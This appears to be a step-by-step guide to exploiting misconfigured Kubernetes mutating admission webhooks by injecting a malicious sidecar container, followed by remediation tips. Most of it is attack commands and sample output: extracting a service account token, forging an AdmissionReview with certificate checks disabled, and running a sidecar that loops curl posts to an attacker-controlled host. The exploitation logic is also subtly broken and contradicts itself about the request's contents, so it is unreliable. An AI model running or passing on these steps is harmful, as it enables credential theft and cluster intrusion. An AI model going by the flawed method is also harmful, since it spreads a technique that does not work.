
# Kubernetes Sidecar Container Injection Attack

## 1. Overview Section

### Attack Vector Description

Sidecar container injection attacks exploit Kubernetes' dynamic admission control features, particularly mutating admission webhooks, to inject malicious containers (sidecars) into pods during their creation. These injected sidecars can then compromise the pod, steal secrets, intercept network traffic, or perform other malicious actions. An attacker typically leverages a misconfigured or vulnerable mutating webhook to inject a sidecar of their choosing.

### Potential Impact and Consequences

The impact of a successful sidecar container injection attack can be severe:

*   **Data Exfiltration:** The malicious sidecar can access and exfiltrate sensitive data stored within the pod or accessible through its network.
*   **Credential Theft:** Kubernetes secrets and other credentials stored in the pod can be stolen.
*   **Denial of Service:** The sidecar can disrupt the application's functionality or consume resources, leading to a denial of service.
*   **Lateral Movement:** By compromising a pod, the attacker can potentially move laterally within the Kubernetes cluster, compromising other applications and services.
*   **Privilege Escalation:** In some cases, a compromised sidecar can be used to escalate privileges within the cluster.

### Risk Level Assessment

**Critical**

### Technical Explanation

The vulnerability exists due to misconfigurations in mutating admission webhooks. These webhooks are designed to modify pod specifications before they are admitted into the cluster. If a webhook lacks proper authentication, authorization, or input validation, an attacker can craft a malicious request that injects a sidecar container into the pod specification. The Kubernetes API server then creates the pod with the injected sidecar, effectively granting the attacker control within the pod's context.  The root cause often boils down to one or more of the following:

*   **Lack of Authentication/Authorization:** The webhook does not properly authenticate or authorize requests, allowing unauthorized users to modify pod specifications.
*   **Insufficient Input Validation:** The webhook does not properly validate the input it receives, allowing attackers to inject arbitrary code or configurations into the pod specification.
*   **Overly Permissive Webhook Scope:** The webhook is configured to apply to a broad range of pods, increasing the attack surface.
*   **Insecure Webhook Configuration:** The webhook itself might be vulnerable to attacks, such as command injection, allowing an attacker to compromise the webhook's functionality.

### Prerequisites and Conditions Needed

*   **Knowledge of Kubernetes API:**  Familiarity with the Kubernetes API and how to interact with it.
*   **Access to the Kubernetes API:**  The attacker needs to be able to make requests to the Kubernetes API.  This could be through an exposed service account, compromised credentials, or access to the cluster's internal network.
*   **Vulnerable Mutating Webhook:** A misconfigured or vulnerable mutating admission webhook must exist in the cluster. The attacker needs to identify and target this webhook.
*   **Target Pod:**  A pod that the vulnerable webhook applies to. The attacker needs to know the labels or other metadata used by the webhook to select pods.
*   **Basic understanding of YAML/JSON:** Needed to craft the malicious API requests.

## 2. Validation and Exploitation Steps Section

**Note:** This example assumes a vulnerable webhook that applies to pods with the label `vulnerable: true`. Replace with the actual label used by your target webhook. We'll use `kubectl` for interacting with the cluster.

**Phase 1: Validation - Identifying and Targeting the Vulnerable Webhook**

1.  **List mutating webhooks:**

    ```bash
    kubectl get mutatingwebhookconfiguration
    ```

    This command lists all mutating webhook configurations in the cluster.  We need to identify the potential target.  Look for webhooks with overly permissive scopes (applies to almost all namespaces/resources) and lack of authentication.

    **Expected Output:** A list of mutating webhook configurations. Examine the output for interesting webhooks.  The output might look like:

    ```
    NAME                                      WEBHOOKS   AGE
    example-webhook-config                      1          10d
    ```

2.  **Describe the suspected vulnerable webhook:**

    ```bash
    kubectl describe mutatingwebhookconfiguration example-webhook-config
    ```

    This command provides detailed information about the selected webhook.  Pay close attention to:

    *   `rules`:  Defines which resources (e.g., pods) and operations (e.g., CREATE) the webhook applies to.
    *   `namespaceSelector` and `objectSelector`: Define which namespaces and objects the webhook applies to.
    *   `clientConfig`: Specifies the URL and CA bundle for the webhook server.
    *   `admissionReviewVersions`: Specifies the version of AdmissionReview objects the webhook supports.  This dictates the structure of the requests we'll need to forge later.

    **Expected Output:** Detailed information about the webhook configuration.  Look for rules that apply to pods, a lack of `namespaceSelector` or `objectSelector` (or overly permissive ones), and a suspicious `clientConfig`.  A critical vulnerability would be if the `caBundle` is empty and there is no authentication set up, making it easier to spoof the request.

    Example:

    ```
    Name:         example-webhook-config
    Namespace:
    Labels:       <none>
    Annotations:  <none>
    API Version:  admissionregistration.k8s.io/v1
    Kind:         MutatingWebhookConfiguration
    Metadata:
      Creation Timestamp:  2023-10-27T10:00:00Z
      Generation:        1
      Resource Version:  12345
      UID:               xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    Webhooks:
      Name:         example-webhook.example.com
      Client Config:
        CABundle:  (Empty)  <-- POTENTIAL VULNERABILITY: NO TLS AUTH
        Service:
          Name:       example-webhook-service
          Namespace:  default
          Path:       /mutate
          Port:       443
      Failure Policy:  Fail
      Match Policy:    Equivalent
      Namespace Selector:  <none>
      Object Selector:     <none>
      Rules:
        apiGroups:   [""]
        apiVersions: ["v1"]
        operations:  ["CREATE"]
        resources:   ["pods"]
      Side Effects:  None
      Timeout Seconds:  30
    ```

3.  **Identify the Target Pod:**  Create or find a pod that the webhook applies to. In this example, we assume the webhook applies to pods with the label `vulnerable: "true"`.

    ```bash
    kubectl create deployment vulnerable-app --image=nginx --replicas=1 --labels=vulnerable=true
    ```

    This creates a simple Nginx deployment with the required label.

    **Expected Output:** Confirmation that the deployment was created.

    ```
    deployment.apps/vulnerable-app created
    ```

4.  **Observe the Existing Pod:**

    ```bash
    kubectl get pods -l vulnerable=true -o yaml
    ```

    Examine the YAML output of the created pod. Take a snapshot of the pod spec before attempting the injection.  This is important to compare against later.  You are looking for what is *not* present in the original manifest.

    **Expected Output:** The YAML definition of the created pod.  Note the containers defined in the pod specification.

**Phase 2: Exploitation - Injecting a Malicious Sidecar**

Now we have identified a potentially vulnerable webhook and a target pod. We can now try to exploit the vulnerability. The exploitation involves crafting a malicious `AdmissionReview` request and sending it to the webhook's endpoint.

5. **Craft a Malicious AdmissionReview Request:**

   This step requires creating a JSON/YAML file that represents the `AdmissionReview` object. This object is sent to the mutating webhook. It includes the pod object and instructions on how to modify it (injecting the sidecar).

   Let's create a file named `malicious-admission-review.yaml`:

   ```yaml
   apiVersion: admission.k8s.io/v1
   kind: AdmissionReview
   request:
     uid: <SOME_UNIQUE_ID> # Generate a unique UUID
     kind:
       group: ""
       version: v1
       kind: Pod
     resource:
       group: ""
       version: v1
       resource: pods
     operation: CREATE
     userInfo:
       username: system:serviceaccount:default:default
       groups:
       - system:authenticated
     object:
       apiVersion: v1
       kind: Pod
       metadata:
         generateName: vulnerable-app-
         labels:
           vulnerable: "true"
           app: vulnerable-app
       spec:
         containers:
         - name: nginx
           image: nginx
         - name: malicious-sidecar
           image: alpine/curl
           command: ["/bin/sh", "-c", "while true; do curl -X POST -d '{\"data\":\"Sidecar compromised pod!\"}' http://attacker.example.com; sleep 5; done"] # Replace with your attacker endpoint
           securityContext:
             allowPrivilegeEscalation: false
             capabilities:
               drop: ["ALL"]
             readOnlyRootFilesystem: true
   response:
     allowed: true
     patchType: JSONPatch
     patch: '[{"op": "add", "path": "/spec/containers/-", "value": {"name": "malicious-sidecar", "image": "alpine/curl", "command": ["/bin/sh", "-c", "while true; do curl -X POST -d \'{\"data\":\"Sidecar compromised pod!\"}\' http://attacker.example.com; sleep 5; done"], "securityContext": {"allowPrivilegeEscalation": false, "capabilities": {"drop": ["ALL"]}, "readOnlyRootFilesystem": true}}}]'
   ```

   **Explanation:**

   *   `apiVersion` and `kind`:  Specify the API version and kind of the object.
   *   `request.uid`:  A unique identifier for the admission request.  Generate a UUID for this.
   *   `request.kind`, `request.resource`, `request.operation`:  Define the resource being created (a pod in this case) and the operation (CREATE).
   *   `request.object`:  The YAML definition of the pod being created. It should match the labels targeted by the vulnerable webhook.  Crucially, it does *not* contain the malicious sidecar.
   *   `response.allowed`:  Indicates that the request is allowed.
   *   `response.patchType`:  Specifies the type of patch being applied. `JSONPatch` is a standard format for modifying JSON objects.
   *   `response.patch`:  A JSONPatch that adds the malicious sidecar container to the pod specification. The `add` operation adds a new container to the `/spec/containers` array at the end.

   **Important:**

   *   Replace `<SOME_UNIQUE_ID>` with a generated UUID (e.g., using `uuidgen`).
   *   Replace `http://attacker.example.com` with the URL of your attack server that will receive the exfiltrated data.
   *   Adjust the `securityContext` of the `malicious-sidecar` as needed for your attack.  The example uses a restrictive context.

6.  **Get Service Account Token:**

    For this example, we will be using the service account token for authentication.

    ```bash
    TOKEN=$(kubectl get secrets -n default | grep default-token | awk '{print $1}')
    TOKEN_VALUE=$(kubectl get secret -n default $TOKEN -o jsonpath='{.data.token}' | base64 --decode)
    ```

    This gets the value of the `default` service account's token.

7.  **Send the Malicious Request:**

   Now, send the crafted `AdmissionReview` request to the webhook endpoint.  You will need the webhook service name, namespace, and path. These can be obtained using `kubectl describe mutatingwebhookconfiguration <webhook-name>`. The `clientConfig.service` contains the necessary information.

   ```bash
   WEBHOOK_SERVICE_NAME=example-webhook-service # Replace with the actual service name
   WEBHOOK_NAMESPACE=default # Replace with the actual namespace
   WEBHOOK_PATH=/mutate # Replace with the actual path
   WEBHOOK_HOST=$(kubectl get svc $WEBHOOK_SERVICE_NAME -n $WEBHOOK_NAMESPACE -o jsonpath='{.spec.clusterIP}')

   curl -k -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN_VALUE"  --data "@malicious-admission-review.yaml" "https://${WEBHOOK_HOST}${WEBHOOK_PATH}"
   ```

   **Explanation:**

   *   `curl`:  The command-line tool for making HTTP requests.
   *   `-k`:  Skips SSL certificate verification (necessary if the webhook uses a self-signed certificate).  **WARNING:**  This is insecure in a production environment.  You should properly configure the CA bundle in the `kubectl` command or the webhook configuration.
   *   `-X POST`:  Specifies the HTTP method as POST.
   *   `-H "Content-Type: application/json"`:  Sets the content type to JSON.
   *   `-H "Authorization: Bearer $TOKEN_VALUE"`:  Sets the Authorization Header to include the Service Account Token.
   *   `--data "@malicious-admission-review.yaml"`:  Sends the contents of the `malicious-admission-review.yaml` file as the request body.
   *   `"https://${WEBHOOK_HOST}${WEBHOOK_PATH}"`:  The URL of the webhook endpoint.

   **Expected Output:**  If successful, the webhook should return a JSON response with `{"response":{"uid":"<SOME_UNIQUE_ID>", "allowed":true, "status":{}}}`. The important part is `allowed: true`. If you get errors here, double-check the webhook configuration, the `malicious-admission-review.yaml` file, and the URL.

8.  **Verify the Sidecar Injection:**

   ```bash
   kubectl get pods -l vulnerable=true -o yaml
   ```

   Examine the YAML output of the pods.  You should now see the `malicious-sidecar` container defined in the pod specification, in addition to the original `nginx` container. You can also check the logs from the attacker server and ensure that data has been exfiltrated.

   **Expected Output:** The YAML definition of the pod, now including the `malicious-sidecar` container.

**Phase 3: Exploitation Verification**

9. **Check Logs of Attacker Server:**

    Check the logs of your attacker server to confirm that the sidecar container has successfully connected and is sending data.

**Remediation Recommendations:**

*   **Implement Strong Authentication and Authorization:**  Ensure that all admission webhooks require strong authentication and authorization.  Use TLS certificates for mutual authentication (mTLS).  Use RBAC to restrict access to the webhook configuration.
*   **Validate Input:**  Thoroughly validate all input received by admission webhooks.  Reject any requests that contain unexpected or malicious data.  Use schema validation to ensure that the input conforms to the expected format.
*   **Minimize Webhook Scope:**  Limit the scope of admission webhooks to the minimum necessary.  Use `namespaceSelector` and `objectSelector` to restrict the webhooks to specific namespaces and objects.
*   **Regularly Audit Webhook Configurations:**  Periodically review admission webhook configurations to ensure that they are still secure and that they are not overly permissive.
*   **Implement Pod Security Policies (PSPs) or Pod Security Admission (PSA):**  Use PSPs or PSA to restrict the capabilities of containers within the cluster.  This can help to mitigate the impact of a compromised sidecar container.  However, remember that PSPs are deprecated.
*   **Monitor Webhook Activity:**  Monitor the activity of admission webhooks for suspicious behavior.  Alert on any unusual requests or errors.
*   **Secure the Webhook Server:** Ensure the webhooks server itself is secured. Patch known vulnerabilities and follow security best practices.
*   **Rotate Secrets:** Regularly rotate secrets used by the webhooks and any applications using them.
*  **Use a Service Mesh:** Implement a service mesh with mTLS to protect internal communications.

This documentation provides a detailed guide on how to validate and exploit a sidecar container injection attack in Kubernetes.  Remember to always perform penetration testing in a controlled environment with appropriate permissions.
